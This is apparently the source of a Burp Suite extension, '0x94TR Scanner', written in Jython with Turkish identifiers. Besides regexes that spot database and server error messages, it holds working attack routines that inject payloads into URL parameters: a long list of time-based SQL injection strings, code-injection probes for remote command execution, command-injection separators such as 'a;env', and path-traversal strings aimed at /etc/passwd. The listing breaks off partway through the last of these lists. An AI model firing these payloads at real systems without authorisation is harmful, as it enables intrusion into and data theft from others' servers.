#!/usr/bin/env python
# -*- coding: utf-8 -*-

from burp import IBurpExtender
from burp import IScannerCheck
from burp import ITab
from burp import IHttpListener
from burp import IMessageEditorController
from java.awt import Component;
from java.io import PrintWriter;
from java.util import ArrayList;
from java.util import List;
from javax.swing import JScrollPane;
from javax.swing import JSplitPane;
from javax.swing import JTabbedPane;
from javax.swing import JTable;
from javax.swing import SwingUtilities;
from javax.swing.table import AbstractTableModel;
from threading import Lock
import re,urllib,urllib2
import urlparse
from urllib import urlencode
from time import sleep
import socket
from burp import IScanIssue
import httplib
from thirdparty.bs4.beautifulsoup import BeautifulSoup
from javax.swing import JMenuItem
from javax.swing import JPopupMenu
from burp import IContextMenuFactory
from burp import IContextMenuInvocation
from java.awt.event import ActionListener
from javax.swing import RowFilter
from java.awt.event import ItemListener
from javax.swing.table import TableRowSorter
from java.net import URL
from thread import start_new_thread

import sys
if sys.version_info[0] == 3:
    # Python 3 
    from urllib.parse import urlparse, parse_qs
else:
    # Python 2 
    from urlparse import parse_qs
    


reload(sys)
sys.setdefaultencoding("utf-8")
analistem = {}




class BurpExtender(IBurpExtender, ITab, IHttpListener, IMessageEditorController, AbstractTableModel,IScannerCheck,IContextMenuFactory):

    #
    # implement IBurpExtender
    #
    
    
    
        
        
    def	registerExtenderCallbacks(self, callbacks):

        global dout, derr
        global postlarisuz
        global ignoreparametre
        
        ignoreparametre=["__VIEWSTATE","__EVENTVALIDATION","__ASYNCPOST","__EVENTTARGET","__EVENTARGUMENT",
                         "_javax.faces.ViewState","javax.faces.ViewState","org.apache.struts.taglib.html.TOKEN","jsessionid","__VIEWSTATEENCRYPTED"]
        postlarisuz={}

        # keep a reference to our callbacks object
        self._callbacks = callbacks

        # obtain an extension helpers object
        self._helpers = callbacks.getHelpers()

        # set our extension name
        callbacks.setExtensionName("0x94TR Scanner")
        
        
        dout = PrintWriter(callbacks.getStdout(), True)
        derr = PrintWriter(callbacks.getStderr(), True)  
        
        
        dout.println("0x94TR Scanner plugin loaded | twitter.com/0x94")

        
        # create the log and a lock on which to synchronize when adding log entries
        self._log = ArrayList()
        self._lock = Lock()

        # main split pane
        self._splitpane = JSplitPane(JSplitPane.VERTICAL_SPLIT)

        # table of log entries
        logTable = Table(self)
        scrollPane = JScrollPane(logTable)

        self._splitpane.setLeftComponent(scrollPane)

        # tabs with request/response viewers
        tabs = JTabbedPane()
        
        self._requestViewer = callbacks.createMessageEditor(self, False)
        self._responseViewer = callbacks.createMessageEditor(self, False)
        tabs.addTab("Payload", self._requestViewer.getComponent())
        tabs.addTab("Response", self._responseViewer.getComponent())
        
        self._splitpane.setRightComponent(tabs)

        # customize our UI components
        callbacks.customizeUiComponent(self._splitpane)
        callbacks.customizeUiComponent(logTable)
        callbacks.customizeUiComponent(scrollPane)      
        callbacks.customizeUiComponent(tabs)

        # add the custom tab to Burp's UI
        callbacks.addSuiteTab(self)

        # register ourselves as an HTTP listener
        callbacks.registerHttpListener(self)
        
        
        sendRequestMenu = JMenuItem("Send Request to Repeater")
        sendRequestMenu.addActionListener(sendRequestRepeater(self))
        
        self.menu = JPopupMenu("Popup")
        self.menu.add(sendRequestMenu)
        
        callbacks.registerContextMenuFactory(self)
                
        callbacks.addSuiteTab(self)

        return

    #
    # implement ITab
    #

    def getTabCaption(self):
        return "0x94 TR"

    def getUiComponent(self):
        return self._splitpane

     
    def createMenuItems(self, invocation):
        responses = invocation.getSelectedMessages()
        if responses > 0:
            ret = LinkedList()
            analyzedMenuItem = JMenuItem("Mark as analyzed")
            notAnalyzedMenuItem = JMenuItem("Mark as NOT analyzed")  
            ret.add(analyzedMenuItem)
            ret.add(notAnalyzedMenuItem)
            return ret

    def hatakontrol(method,self,url,response,urlnormal):


        if re.search("DEBUG = True in your Django settings file",response,re.DOTALL):
            mesaj= "[#] %s Django Config" % urlnormal
            self.ekle(method,url,"Django Config error", "",response)


        if re.search("xmlXPathEval: evaluation failed",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("SimpleXMLElement::xpath()",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("XPathException",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("MS.Internal.Xml.",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("XPathException",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("Unknown error in XPath",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("org.apache.xpath.XPath",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("A closing bracket expected in",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("An operand in Union Expression does not produce a node-set",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("Cannot convert expression to a number",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("Document Axis does not allow any context Location Steps",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("Empty Path Expression",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("Empty Relative Location Path",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("Empty Union Expression",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("Expected '\)' in",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("Expected node test or name specification after axis operator",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("Incompatible XPath key",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("Incorrect Variable Binding",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("libxml2 library function failed",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("XPathException",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("xmlsec library function",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("error '80004005'",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("A document must contain exactly one root element.",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("Expression must evaluate to a node-set.",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("Expected token '\]'",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("<p>msxml4.dll</font>",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("<p>msxml3.dll</font>",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("4005 Notes error: Query is not understandable",response,re.DOTALL):
            mesaj= "[#] %s Xpath Error" % urlnormal
            self.ekle(method,url,"Xpath error", "",response)

        if re.search("DB2 SQL error:",response,re.DOTALL):
            mesaj= "[#] %s DB2 ERROR " % urlnormal
            self.ekle(method,url,"Db2 error", "",response)

        if re.search("supplied argument is not a valid ldap",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("javax.naming.NameNotFoundException",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("LDAPException",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("Search: Bad search filter",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("Protocol error occurred",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("Size limit has exceeded",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("An inappropriate matching occurred",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("A constraint violation occurred",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("The syntax is invalid",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("Object does not exist",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("The alias is invalid",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("The distinguished name has an invalid syntax",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("The server does not handle directory requests",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("There was a naming violation",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("There was an object class violation",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("Results returned are too large",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("Unknown error occurred",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("Local error occurred",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("The search filter is incorrect",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("The search filter is invalid",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("The search filter cannot be recognized",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)


        if re.search("Invalid DN syntax",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)


        if re.search("No Such Object",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)

        if re.search("IPWorksASP.LDAP",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)


        if re.search("Module Products.LDAPMultiPlugins",response,re.DOTALL):
            mesaj= "[#] %s LDAP ERROR " % urlnormal
            self.ekle(method,url,"LDAP error", "",response)


        if re.search("eval()'d code</b> on line <b>",response,re.DOTALL):
            mesaj= "[#] %s PHP eval hatasi " % urlnormal
            self.ekle(method,url,"Php Eval error", "",response)

        if re.search("Cannot execute a blank command in",response,re.DOTALL):
            mesaj= "[#] %s exec hatasi " % urlnormal
            self.ekle(method,url,"Exec error", "",response)

        if re.search("Fatal error</b>:  preg_replace",response,re.DOTALL):
            mesaj= "[#] %s Ppreg_replace hatasi " % urlnormal
            self.ekle(method,url,"preg_replace error", "",response)


        if re.search("Microsoft OLE DB Provider for SQL Server",response,re.DOTALL):
            mesaj= "[#] %s MS-SQL Server error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Syntax error in string in query",response,re.DOTALL):
            mesaj= "[#] %s SQL error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Conversion failed when converting the nvarchar",response,re.DOTALL):
            mesaj= "[#] %s MSSQL error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("\[Microsoft\]\[ODBC Microsoft Access Driver\] Syntax error",response,re.DOTALL):
            mesaj= "[#] %s MS-Access error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Microsoft OLE DB Provider for ODBC Drivers.*\[Microsoft\]\[ODBC SQL Server Driver\]",response,re.DOTALL):
            mesaj= "[#] %s MS-SQL Server error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Microsoft OLE DB Provider for ODBC Drivers.*\[Microsoft\]\[ODBC Access Driver\]",response,re.DOTALL):
            mesaj= "[#] %s MS-Access error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Microsoft JET Database Engine",response,re.DOTALL):
            mesaj= "[#] %s MS Jet database engine error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("ADODB.Command.*error",response,re.DOTALL):
            mesaj= "[#] %s ADODB Error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Microsoft VBScript runtime",response,re.DOTALL):
            mesaj= "[#] %s VBScript runtime error" % urlnormal
            self.ekle(method,url,"VBSCRIPT  error", "",response)

        if re.search("Type mismatch",response,re.DOTALL):
            mesaj= "[#] %s VBScript / ASP error" % urlnormal
            self.ekle(method,url,"VBSCRIPT error", "",response)

        if re.search("Server Error.*System\.Data\.OleDb\.OleDbException",response,re.DOTALL):
            mesaj= "[#] %s ASP .NET OLEDB Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Invalid SQL statement or JDBC",response,re.DOTALL):
            mesaj= "[#] %s Apache Tomcat JDBC error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("mysql_fetch_array() expects parameter",response,re.DOTALL):
            mesaj= "[#] %s MySQL Server error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("XML parser error",response,re.DOTALL):
            mesaj= "[#] %s XML Error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Warning: mysql_fetch_array",response,re.DOTALL):
            mesaj= "[#] %s MySQL Server error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Warning.*supplied argument is not a valid MySQL result",response,re.DOTALL):
            mesaj= "[#] %s MySQL Server error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("You have an error in your SQL syntax.*on line",response,re.DOTALL):
            mesaj= "[#] %s MySQL Server error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("You have an error in your SQL syntax.*at line",response,re.DOTALL):
            mesaj= "[#] %s MySQL Server error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Warning.*mysql_.*\(\)",response,re.DOTALL):
            mesaj= "[#] %s MySQL Server error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("ORA-[0-9][0-9][0-9][0-9]",response,re.DOTALL):
            mesaj= "[#] %s Oracle DB Server error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("DorisDuke error",response,re.DOTALL):
            mesaj= "[#] %s DorisDuke error\n" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("javax\.servlet\.ServletException",response,re.DOTALL):
            mesaj= "[#] %s Java Servlet error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("org\.apache\.jasper\.JasperException",response,re.DOTALL):
            mesaj= "[#] %s Apache Tomcat error" % urlnormal
            self.ekle(method,url,"Tomcat error", "",response)

        if re.search("Warning.*failed to open stream",response,re.DOTALL):
            mesaj= "[#] %s PHP error" % urlnormal
            self.ekle(method,url,"PHP error", "",response)

        if re.search("Fatal Error.*on line",response,re.DOTALL):
            mesaj= "[#] %s PHP error" % urlnormal
            self.ekle(method,url,"PHP error", "",response)

        if re.search("Warning: mysql_num_rows():",response,re.DOTALL):
            mesaj= "[#] %s MYSQL ERROR " % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Unclosed quotation mark",response,re.DOTALL):
            mesaj= "[#] %s MSSQL ERROR " % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("java.sql.SQLException",response,re.DOTALL):
            mesaj= "[#] %s Java SQL ERROR " % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("SqlClient.SqlException",response,re.DOTALL):
            mesaj= "[#] %s SqlClient ERROR " % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Incorrect syntax near",response,re.DOTALL):
            mesaj= "[#] %s SQL ERROR " % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("PostgreSQL query failed",response,re.DOTALL):
            mesaj= "[#] %s PostgreSQL ERROR " % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("500 - Internal server error",response,re.DOTALL):
            mesaj= "[#] %s Internal server error " % urlnormal
            self.ekle(method,url,"Server error", "",response)

        if re.search("Unclosed quotation mark",response,re.DOTALL):
            mesaj= "[#] %s MSSQL ERROR" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("java.sql.SQLException",response,re.DOTALL):
            mesaj= "[#] %s Java Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("valid PostgreSQL result",response,re.DOTALL):
            mesaj= "[#] %s PostgreSQL Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Oracle.*Driver",response,re.DOTALL):
            mesaj= "[#] %s PostgreSQL Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Procedure '[^']+' requires parameter '[^']+'",response,re.DOTALL):
            mesaj= "[#] %s Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Sybase message:",response,re.DOTALL):
            mesaj= "[#] %s Sybase Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Column count doesn't match:",response,re.DOTALL):
            mesaj= "[#] %s MySQL Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Dynamic Page Generation Error:",response,re.DOTALL):
            mesaj= "[#] %s Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("<b>Warning<b>: ibase_",response,re.DOTALL):
            mesaj= "[#] %s Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Dynamic SQL Error",response,re.DOTALL):
            mesaj= "[#] %s Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("\[Macromedia\]\[SQLServer JDBC Driver\]",response,re.DOTALL):
            mesaj= "[#] %s Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("An illegal character has been found in the statement",response,re.DOTALL):
            mesaj= "[#] %s Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("A Parser Error \(syntax error\)",response,re.DOTALL):
            mesaj= "[#] %s Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("where clause",response,re.DOTALL):
            mesaj= "[#] %s Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("PostgreSQL.*ERROR",response,re.DOTALL):
            mesaj= "[#] %s PostgreSQL Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("CLI Driver.*DB2",response,re.DOTALL):
            mesaj= "[#] %s Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Exception.*Informix",response,re.DOTALL):
            mesaj= "[#] %s Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("SQLite/JDBCDriver",response,re.DOTALL):
            mesaj= "[#] %s SQLite Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("SQLite\.Exception",response,re.DOTALL):
            mesaj= "[#] %s SQLite Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("(PLS|ORA)-[0-9][0-9][0-9][0-9]",response,re.DOTALL):
            mesaj= "[#] %s Oracle Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("Warning: mysql_connect()",response,re.DOTALL):
            mesaj= "[#] %s Mysql Connect Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("mysql_connect(): Access denied",response,re.DOTALL):
            mesaj= "[#] %s Mysql Connect Exception" % urlnormal
            self.ekle(method,url,"SQL error", "",response)

        if re.search("fpassthru() expects ",response,re.DOTALL):
            mesaj= "[#] %s PHP fpassthru Exception" % urlnormal
            self.ekle(method,url,"PHP fpassthru error", "",response)


        if re.search("Query timeout expired ",response,re.DOTALL):
            mesaj= "[#] %s MSSQL Time Based Error" % urlnormal
            self.ekle(method,url,"SQL error", "",response)
        
    def timebased(self,url):
        protocol=urlparse.urlparse(url).scheme+"://"
        timesql=[" WAITFOR DELAY '0:0:25';--",
                         "') OR SLEEP(25)"
                         "sleep(25)",
                 "1') AND SLEEP(25) AND ('LoUL'='LoUL",
                 "' WAITFOR DELAY '0:0:25' and 'a'='a;--",
                "' and  sleep(25) and  'a'='a",
                "' WAITFOR DELAY '0:0:25';--",
               " IF 1=1 THEN dbms_lock.sleep(25);",
               " ' IF 1=1 THEN dbms_lock.sleep(25);",
                 "' waitfor delay '0:0:25';--",
                 " ' WAITFOR DELAY '0:0:25';--",
                 "; SLEEP(25)",
                 " SLEEP(25)",
                 "' SLEEP(25)--",
                 "' SLEEP(25)",
                 " pg_sleep(25)",
                 " ' pg_sleep(25)",
                 " PG_DELAY(25)",
                 " ' PG_DELAY(25)",
                 " and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--",
                 " ' and if(substring(user(),1,1)>=chr(97),SLEEP(25),1)--",
                 " DBMS_LOCK.SLEEP(25);",
                 " AND if not(substring((select @version),25,1) < 52) waitfor delay  '0:0:25'--",
                 "1,'0');waitfor delay '0:0:25;--",
                 "');waitfor delay'0:0:25';--",
                 ");waitfor delay '0:0:25';--",
                 "' and pg_sleep(25)--",
                 "1) and pg_sleep(25)--",
                 "\") and pg_sleep(25)--",
                 "') and pg_sleep(25)--",
                 "1)) and pg_sleep(25)--",
                 ")) and pg_sleep(25)--",
                 "')) and pg_sleep(25)--",
                 "\")) or pg_sleep(25)--",
                 "')) or pg_sleep(25)--",
                 "1) and sleep(25)--",
                 "\") and sleep(25)--",
                 "') and sleep(25)--",
                 "1)) and sleep(25)--",
                 ")) and sleep(25)--",
                 "')) and sleep(25)--",
                 "\")) or sleep(25)--",
                 "' or pg_sleep(25)--",
                 "')) or sleep(25)--",
                 "(SELECT 1 FROM (SELECT SLEEP(25))A)",
                 "'%2b(select*from(select(sleep(25)))a)%2b'",
                 "1' or (sleep(49)+1) limit 1 -- ",
                 "';WAITFOR DELAY '0:0:25'--",
                 "1;WAITFOR DELAY '0:0:25'--",
                 "WAITFOR DELAY '0:0:25'--",
                 "1);WAITFOR DELAY '0:0:25'--",
                 "');WAITFOR DELAY '0:0:25'--",
             "'));WAITFOR DELAY '0:0:25'--",
            "1));WAITFOR DELAY '0:0:25'--",
            "-1 AND (SELECT 1 FROM (SELECT 2)a WHERE 1=sleep(25))-- 1",
              "(select sleep(25))a--",
              "(select dbms_pipe.receive_message((chr(48)||chr(120)||chr(57)||chr(52)),20) from dual)",
              "1' || (select dbms_pipe.receive_message((chr(48)||chr(120)||chr(57)||chr(52)),20) from dual) || '",
              "';SELECT pg_sleep(25)--",
              "1;SELECT pg_sleep(25)--",
              "SELECT pg_sleep(25)--",
              "1);SELECT pg_sleep(25)--",
              "');SELECT pg_sleep(25)--",
              "'));SELECT pg_sleep(25)--",
              "1));SELECT pg_sleep(25)--",
              "1 + (select dbms_pipe.receive_message((chr(48)||chr(120)||chr(57)||chr(52)),20) from dual) + 1",
              "(SELECT 1 FROM (SELECT SLEEP(25))A)",
              "'+(SELECT 1 FROM (SELECT SLEEP(25))A)+'",
              "-1' or 1=(SELECT 1 FROM (SELECT SLEEP(25))A)+'",
              "'%2b(select*from(select(sleep(25)))a)%2b'",
              "-1\" or 1=(SELECT 1 FROM (SELECT SLEEP(25))A)+\""]

        for timeler in timesql:
            try:
                yenitime={}
                #yenipath=""
                for key,value in parse_qs(urlparse.urlparse(url).query, True).items():
                    yenitime[key]=timeler
                    #yenipath+="?"+key+"="+value[0]

                host=urlparse.urlparse(url).netloc
                dosya=urlparse.urlparse(url).path

                encoded_args = urllib.urlencode(yenitime)
                responsex = urllib2.urlopen(protocol+host+dosya+"?"+encoded_args,timeout=20)
                responsey = self.temizle(responsex.read())

            except urllib2.HTTPError,  e:
                if(e.code==500 or e.code==504):
                    if "Time" in e.reason:
                        self.ekle("GET",url,"Timebased SQL Injection", url+"\nPayload:"+encoded_args,e.read())


            except socket.timeout:
                self.ekle("GET",url,"Timebased SQL Injection", url+"\nPayload:"+encoded_args,"Timeout")

            except urllib2.URLError,  e:
                if "Time" in e.reason:
                    self.ekle("GET",url,"Timebased SQL Injection",url+"\nPayload:"+encoded_args, e.read())

            except:
                mesaj="Error"



    def normalac(self,url):
        

        ajaxtespit=["jquery.ajax","$.ajax","xmlhttprequest","msxml2.xmlhttp"]
        socket=["new WebSocket("]

        try:
            

            urlac = urllib2.urlopen(url)
            response = urlac.read()
    
            for ajx in ajaxtespit:
                if ajx in response:
                    return True,url+" Ajax Code",ajx,response
    
            for sck in socket:
                if sck in response:
                    self.ekle("GET",url,"Ajax Code", sck,response)
    
            if "<?xml" not in response and "%PDF" not in response:
                if "<?php" in response and "?>" in response:
                    self.ekle("GET",url,"PHP Code","php tag <?php ?>",response)
                    
                
               # elif "<%" in response and "%>" in response:
                #    return True,url+" ASP Code",response


        except urllib2.HTTPError,  e:
            a="asad"

        except:
            b="daaf"
    

    def indexoful(self,url):


        try:
            protocol=urlparse.urlparse(url).scheme+"://"
            if url.count("/")>=4:

                if url.count("/")==4:
                    dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"
                elif url.count("/")==5:
                    dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"
                elif url.count("/")==6:
                    dizin=protocol+url.rsplit("/")[2]+"/"+url.rsplit("/")[3]+"/"+url.rsplit("/")[4]+"/"+url.rsplit("/")[5]+"/"

                try:
            
                    urlac = urllib2.urlopen(dizin)
                    response = urlac.read()
            
                    if "<title>index of" in response or \
                                       "directory listing for" in response or \
                                       "<title>folder listing" in response  or \
                       "<table summary=\"directory listing" in response or  \
                       "browsing directory" in response or  \
                    "[to parent directory]" in response:
                        self.ekle("GET",url,"Index Off", dizin,response)                    
                        # elif "<%" in response and "%>" in response:
                        #    return True,url+" ASP Code",response
            
            
                except urllib2.HTTPError,  e:
                    a="asad"
            
                except:
                    b="daaf"



                

        except:
            mesaj="Error"  


       


    def getrce(self,url):

        rceler = ["#print(int)0xFFF123-1",
                          "+#print(int)0xFFF123-1;//",
                          "'+#print(int)0xFFF123-1+'",
                  "\"+#print(int)0xFFF123-1+",
                  "<? #print(int)0xFFF123-1;//?>",
                 "{php}#print(int)0xFFF123-1;{/php}",
                "'{${#print(int)0xFFF123-1}}'",
                "[php]#print(int)0xFFF123-1;[/php]",
                  "#print 0xFFF123-1",
                   "eval('#print 0xFFF123-1')",
                   "'+#print 0xFFF123-1+'",
                   "\"+#print 0xFFF123-1+",
                   "${@#print(0xFFF123-1);}"]

        for remotecommand in rceler:
            
            try:
                for key,value in parse_qs(urlparse.urlparse(url).query, True).items():
                    
                    rcehal={}
                    rcehal[key]=remotecommand
                    rceparametre = urllib.urlencode(rcehal)
                    urlac = urllib2.urlopen(url+"?"+rceparametre)
                    response = urlac.read()
                    if "167734101" in response:
                        self.ekle("GET",url,"Remote Command Execution",rceparametre, response)


            except urllib2.HTTPError,  e:
                if "167734101" in e.read():
                    self.ekle("GET",url,"Remote Command Execution",rceparametre, response)

            except:
                mesaj="Error"

       


    def phpexec(self,url):

        seperators = ["a;env","a);env","/e\0"]


        for sep in seperators:
            try:
                for key,value in parse_qs(urlparse.urlparse(url).query, True).items():
                    phpexechal={}
                    phpexechal[key]=sep
                phpexecparametre = urllib.urlencode(phpexechal)
                urlac = urllib2.urlopen(url+"?"+phpexecparametre)
                response = urlac.read()
                self.hatakontrol("GET",url,response,url)
        

            except urllib2.HTTPError,  e:
                if(e.code==302):
                    self.hatakontrol("GET,",url,e.read(),url)
                   
                if(e.code==500):
                    self.hatakontrol("GET",url,e.read(),url)
                                       

            except:
                mesaj="Error"


    def lfitara(self,lfibul):
        

        lfiyollar=['/etc/passwd',
                           '../etc/passwd',
                           '../../etc/passwd',
                   '../../../etc/passwd',
                   '../../../../etc/passwd',
                  '../../../../../etc/passwd',
                 '../../../../../../etc/passwd',
